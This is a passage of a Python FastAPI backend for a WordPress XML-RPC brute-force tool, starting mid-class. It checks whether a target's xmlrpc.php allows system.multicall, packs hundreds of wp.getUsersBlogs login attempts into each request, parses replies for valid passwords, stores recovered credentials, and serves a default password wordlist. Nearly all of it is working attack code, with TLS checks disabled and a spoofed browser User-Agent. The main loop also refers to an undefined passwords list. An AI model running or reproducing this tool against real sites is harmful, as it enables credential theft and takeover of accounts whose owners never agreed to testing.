    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    target_url: str
    started_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    finished_at: Optional[datetime] = None
    total_attempts: int = 0
    credentials_found: List[Dict[str, str]] = []
    xmlrpc_enabled: bool = False
    multicall_enabled: bool = False
    status: str = "running"
    error: Optional[str] = None


def build_multicall_payload(username: str, passwords: List[str]) -> str:
    """Build XML-RPC multicall payload for brute force"""
    method_calls = ""
    for pwd in passwords:
        method_calls += f"""
        <value>
            <struct>
                <member>
                    <name>methodName</name>
                    <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                    <name>params</name>
                    <value>
                        <array>
                            <data>
                                <value><string>{username}</string></value>
                                <value><string>{pwd}</string></value>
                            </data>
                        </array>
                    </value>
                </member>
            </struct>
        </value>"""
    
    return f"""<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>{method_calls}
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>"""


def parse_multicall_response(response_text: str, passwords: List[str]) -> List[Dict]:
    """Parse multicall response to find successful logins"""
    found = []
    
    # Look for successful responses (contains blog info, not faultCode)
    # Split response by methodResponse or value tags
    responses = re.findall(r'<value>(.*?)</value>', response_text, re.DOTALL)
    
    for i, resp in enumerate(responses):
        if i < len(passwords):
            # Check if this is a successful response (contains blogid or isAdmin)
            if ('blogid' in resp.lower() or 'isadmin' in resp.lower() or 
                ('array' in resp.lower() and 'faultcode' not in resp.lower())):
                # Check it's not an error
                if 'faultcode' not in resp.lower() and 'incorrect' not in resp.lower():
                    found.append({"password": passwords[i], "response_snippet": resp[:200]})
    
    return found


async def check_xmlrpc_multicall(client: httpx.AsyncClient, base_url: str) -> tuple:
    """Check if XMLRPC and multicall are enabled"""
    xmlrpc_enabled = False
    multicall_enabled = False
    
    try:
        # Check XMLRPC
        resp = await client.post(
            f"{base_url}/xmlrpc.php",
            content='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
            headers={"Content-Type": "text/xml"},
            timeout=10
        )
        
        if resp.status_code == 200 and 'methodresponse' in resp.text.lower():
            xmlrpc_enabled = True
            if 'system.multicall' in resp.text:
                multicall_enabled = True
                
    except Exception as e:
        logging.error(f"XMLRPC check error: {e}")
    
    return xmlrpc_enabled, multicall_enabled


@api_router.post("/bruteforce/start")
async def start_bruteforce(request: BruteForceRequest):
    """Start XMLRPC multicall brute force attack"""
    try:
        base_url = normalize_url(request.target_url)
        
        result = {
            "id": str(uuid.uuid4()),
            "target_url": base_url,
            "started_at": datetime.now(timezone.utc),
            "finished_at": None,
            "total_attempts": 0,
            "credentials_found": [],
            "user_info_disclosed": [],  # NEW: User info from wp.getUsers
            "xmlrpc_enabled": False,
            "multicall_enabled": False,
            "status": "running",
            "error": None,
            "progress": [],
            "usernames_tested": request.usernames,
            "passwords_count": 0,
            "password_sources": []
        }
        
        async with httpx.AsyncClient(
            timeout=60,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "text/xml"
            },
            verify=False
        ) as client:
            
            # Check XMLRPC status
            xmlrpc_enabled, multicall_enabled = await check_xmlrpc_multicall(client, base_url)
            result["xmlrpc_enabled"] = xmlrpc_enabled
            result["multicall_enabled"] = multicall_enabled
            
            if not xmlrpc_enabled:
                result["status"] = "failed"
                result["error"] = "XMLRPC is disabled on target"
                result["finished_at"] = datetime.now(timezone.utc)
                return result
            
            if not multicall_enabled:
                result["status"] = "failed"
                result["error"] = "system.multicall is not available"
                result["finished_at"] = datetime.now(timezone.utc)
                return result
            
            # Start brute force for each username
            for username in request.usernames:
                result["progress"].append({"username": username, "status": "testing", "found": False})
                
                # Split passwords into batches
                batch_size = min(request.batch_size, 500)  # Max 500 per request
                
                for i in range(0, len(passwords), batch_size):
                    batch = passwords[i:i + batch_size]
                    
                    # Build and send multicall request
                    payload = build_multicall_payload(username, batch)
                    
                    try:
                        resp = await client.post(
                            f"{base_url}/xmlrpc.php",
                            content=payload,
                            timeout=30
                        )
                        
                        result["total_attempts"] += len(batch)
                        
                        if resp.status_code == 200:
                            # Parse response for successful logins
                            found = parse_multicall_response(resp.text, batch)
                            
                            for f in found:
                                cred = {
                                    "username": username,
                                    "password": f["password"],
                                    "found_at": datetime.now(timezone.utc).isoformat()
                                }
                                result["credentials_found"].append(cred)
                                
                                # Update progress
                                for p in result["progress"]:
                                    if p["username"] == username:
                                        p["found"] = True
                                        p["password"] = f["password"]
                                
                        # Small delay to avoid overwhelming server
                        await asyncio.sleep(0.5)
                        
                    except Exception as e:
                        logging.error(f"Batch request error: {e}")
                        continue
                
                # Update progress status
                for p in result["progress"]:
                    if p["username"] == username:
                        p["status"] = "completed"
            
            result["status"] = "completed"
            result["finished_at"] = datetime.now(timezone.utc)
            
            # Save to database
            doc = result.copy()
            doc['started_at'] = doc['started_at'].isoformat()
            if doc['finished_at']:
                doc['finished_at'] = doc['finished_at'].isoformat()
            await db.bruteforce_results.insert_one(doc)
            
            return result
            
    except Exception as e:
        logging.error(f"Brute force error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/bruteforce/history")
async def get_bruteforce_history():
    """Get brute force attack history"""
    try:
        results = await db.bruteforce_results.find(
            {},
            {"_id": 0, "progress": 0}
        ).sort("started_at", -1).to_list(50)
        return results
    except Exception as e:
        logging.error(f"Error fetching history: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/bruteforce/{result_id}")
async def get_bruteforce_result(result_id: str):
    """Get specific brute force result"""
    try:
        result = await db.bruteforce_results.find_one({"id": result_id}, {"_id": 0})
        if not result:
            raise HTTPException(status_code=404, detail="Result not found")
        return result
    except HTTPException:
        raise
    except Exception as e:
        logging.error(f"Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/wordlist")
async def get_default_wordlist():
    """Get default password wordlist"""
    return {"passwords": DEFAULT_PASSWORDS, "count": len(DEFAULT_PASSWORDS)}


# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
